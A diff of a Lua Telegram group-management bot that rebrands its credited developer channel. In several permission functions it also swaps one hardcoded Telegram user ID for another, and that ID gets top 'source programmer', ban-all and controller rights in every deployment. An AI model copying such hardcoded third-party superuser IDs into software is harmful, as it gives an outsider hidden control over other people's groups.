@@ -1,8 +1,8 @@
 ------------------------------------------------
--- This Source Was Developed By (Spark) @BBLBB0.--
---   This Is The Source Channel @BBLBB0 .   --
+-- This Source Was Developed By (Spark) @REVERTEAM.--
+--   This Is The Source Channel @REVERTEAM .   --
 --                - Spark-                 --
---        -- https://t.me/BBLBB0 --         --
+--        -- https://t.me/REVERTEAM --         --
 ------------------------------------------------ 
 URL     = require("./libs/url")
 JSON    = require("./libs/dkjson")
@@ -117,7 +117,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1127044647}  
+local ListSudos ={Sudo_Id,1931989685}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -128,9 +128,9 @@ end
 function Controllerbanall(ChatId,UserId)
 Status = 0
 DevelopersQ = Redis:sismember(TheSpark.."Spark:DevelopersQ:Groups",UserId) 
-if UserId == 1127044647 then
+if UserId == 1931989685 then
 Status = true
-elseif UserId == 1127044647 then
+elseif UserId == 1931989685 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -154,9 +154,9 @@ Managers = Redis:sismember(TheSpark.."Spark:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(TheSpark.."Spark:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheSpark.."Spark:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1127044647 then
+if UserId == 1931989685 then
 Status = 'مبرمج السورس'
-elseif UserId == 1127044647 then
+elseif UserId == 1931989685 then
 Status = 'مطور السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
@@ -734,9 +734,9 @@ Managers = Redis:sismember(TheSpark.."Spark:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(TheSpark.."Spark:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheSpark.."Spark:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1127044647 then
+if UserId == 1931989685 then
 Status = true
-elseif UserId == 1127044647 then
+elseif UserId == 1931989685 then
 Status = true
 elseif UserId == Sudo_Id then  
 Status = true
@@ -773,9 +773,9 @@ Managers = Redis:sismember(TheSpark.."Spark:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(TheSpark.."Spark:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(TheSpark.."Spark:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1127044647 then
+if UserId == 1931989685 then
 Status = true
-elseif UserId == 1127044647 then
+elseif UserId == 1931989685 then
 Status = true
 elseif UserId == Sudo_Id then    
 Status = true
@@ -901,10 +901,10 @@ return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberSt
 elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
-if tonumber(msg.sender.user_id) == 1127044647 then
+if tonumber(msg.sender.user_id) == 1931989685 then
 msg.Name_Controller = 'مبرمج السورس '
 msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 1127044647 then
+elseif tonumber(msg.sender.user_id) == 1931989685 then
 msg.Name_Controller = 'مطور السورس '
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
@@ -2496,7 +2496,7 @@ end
 end   
 Get_Json = Get_Json..'],'
 end
-Get_Json = Get_Json..'"Dev":"BBLBB0"}'
+Get_Json = Get_Json..'"Dev":"REVERTEAM"}'
 end
 Get_Json = Get_Json..'}}'
 local File = io.open('./'..UserBot..'.json', "w")
@@ -9775,7 +9775,7 @@ Redis:del(TheSpark..'Spark:Texting:DevTheSpark')
 return LuaTele.sendText(msg_chat_id,msg_id,'᥀︙ تم حذف كليشه المطور')
 end
 if text == 'مبرمج سورس' or text == 'مبرمج السورس' or text == 'المبرمج' then  
-local UserId_Info = LuaTele.searchPublicChat("BBLBB0")
+local UserId_Info = LuaTele.searchPublicChat("REVERTEAM")
 if UserId_Info.id then
 local UserInfo = LuaTele.getUser(UserId_Info.id)
 local InfoUser = LuaTele.getUserFullInfo(UserId_Info.id)
@@ -9800,7 +9800,7 @@ local TestText = "- معلومات مبرمج السورس : \\nn: name Dev . ["
 keyboardd = {} 
 keyboardd.inline_keyboard = {
 {
-{text = '❲ 𝖼𝗈𝖽𝖾𝗋 ❳', url = "https://t.me/BBLBB0"}
+{text = '❲ 𝖼𝗈𝖽𝖾𝗋 ❳', url = "https://t.me/REVERTEAM"}
 },
 {
 {text = '❲ Spark ❳', url = "https://t.me/xrxnr"},
@@ -9923,7 +9923,7 @@ data = {
 {text = 'Communication Source', url = 't.me/PEE9BOT'}, 
 },
 {
-{text = 'Developer Source !', url = 't.me/BBLBB0'}, 
+{text = 'Developer Source !', url = 't.me/REVERTEAM'}, 
 },
 }
 }
@@ -11322,7 +11322,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '᥀ السورس .', url = 't.me/xrxnr'},{text = '᥀ لتنصيب بوت .', url = 't.me/BBLBB0'}, 
+{text = '᥀ السورس .', url = 't.me/xrxnr'},{text = '᥀ لتنصيب بوت .', url = 't.me/REVERTEAM'}, 
 },
 {
 {text = '᥀ اضفني في مجموعتك .', url = 't.me/'..UserBot..'?startgroup=new'}, 
@@ -11335,7 +11335,7 @@ local reply_markup = LuaTele.replyMarkup{
 type = 'inline',
 data = {
 {
-{text = '᥀ السورس .', url = 't.me/xrxnr'},{text = '᥀ لتنصيب بوت .', url = 't.me/BBLBB0'}, 
+{text = '᥀ السورس .', url = 't.me/xrxnr'},{text = '᥀ لتنصيب بوت .', url = 't.me/REVERTEAM'}, 
 },
 {
 {text = '᥀ اضفني في مجموعتك .', url = 't.me/'..UserBot..'?startgroup=new'}, 
